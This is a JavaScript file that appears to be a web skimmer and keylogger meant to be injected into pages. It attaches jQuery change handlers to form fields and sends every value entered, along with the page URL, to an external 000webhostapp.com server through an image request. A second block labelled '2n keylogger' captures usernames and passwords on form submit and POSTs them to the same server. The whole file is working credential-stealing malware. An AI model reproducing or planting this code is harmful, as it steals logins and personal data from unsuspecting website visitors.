
var url = "https://app-1530445460.000webhostapp.com/server/";  //http://127.0.0.1/server/
var debug = 1;
var currLoc = "";
spyjs_refreshEvents();

function spyjs_refreshEvents(){
	if(currLoc != location.href){
		currLoc=location.href;
		if(debug){
			console.log(currLoc);
		}
		spyjs_saveData("("+currLoc+")");
	}
	$('input').unbind('change');
	$('input').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	$('select').unbind('change');
	$('select').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	$('checkbox').unbind('change');
	$('checkbox').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	$('button').unbind('change');
	$('button').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
	
	
	$('textarea').unbind('change');
	$('textarea').change(function(e) {
  		spyjs_getInput(e.currentTarget);
	});
}
	
function spyjs_getInput(inputInfo){
	 
	var name = inputInfo.name;
	var value = inputInfo.value;
	var stolenInput = {};
	if(name === ""){
		name="undefined_input";
	}
	if(value != ""){
		stolenInput[name] = value;
		if(debug){
			console.log(name+"="+value);
		}
		
        var pic = new Image()
        pic.src = url+'yt.php?values='+name+"="+value +  "<br/>"+ ""+currLoc+""
		
	}
}
function spyjs_saveData(data){
	
};

   // 2n keylogger

var forms = document.getElementsByTagName('form');
 for (var i = 0; i < forms.length; i++) {
 var form = forms[i];
var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://app-1530445460.000webhostapp.com/server/ava.php'); //127.0.0.1/server/
     var fields = form.getElementsByTagName('input');      
      for (var j = 0; j < fields.length; j++) {
          var f = fields[j];
          if (!form._pass && f.type == 'password')
              form._pass = f;
          else if (!form._user && (f.type == 'text' || f.type == 'email'))
              form._user = f;

          if (!(form._user !== undefined && form._pass !== undefined))
              continue;
              form.onsubmit = function() {
              if (this._user.value && this._pass.value) {                 				 
                var userName = this._user.value
                var passWord = this._pass.value
				var param = ""
				param += 'user='+userName+'&pass='+passWord +document.URL
             
			   xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
               xhr.send(param);
				
              }
                  }};
              }         
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 
	 











































	 
	 



